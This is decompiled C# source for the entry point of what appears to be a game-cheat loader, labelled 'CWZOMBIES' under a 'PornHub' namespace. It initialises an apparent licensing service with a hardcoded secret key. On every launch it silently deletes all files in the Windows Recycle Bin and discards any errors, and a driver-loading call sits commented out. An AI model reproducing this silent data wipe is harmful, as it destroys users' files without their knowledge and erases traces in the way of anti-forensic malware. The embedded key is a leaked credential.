using System;
using System.IO;
using System.Windows.Forms;
using PornHub.Security;

namespace PornHub
{
	// Token: 0x0200000D RID: 13
	internal static class Program
	{
		// Token: 0x06000087 RID: 135 RVA: 0x00017338 File Offset: 0x00015538
		[STAThread]
		private static void Main(string[] args)
		{
			OnProgramStart.Initialize("CWZOMBIES", "782584", "EbVOyQVyCOLRjbz1Lnm8pKlzW6SjQaMrBDF", "1.0");
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			string path = "C:\\$Recycle.Bin\\";
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			foreach (FileInfo fileInfo in directoryInfo.GetFiles("*.*"))
			{
				try
				{
					File.Delete(fileInfo.FullName);
				}
				catch
				{
				}
			}
			//Functions.TryLoadDriver();
			Form3 Form3 = new Form3();
			Form3.Show();
			Application.Run();
		}
	}
}
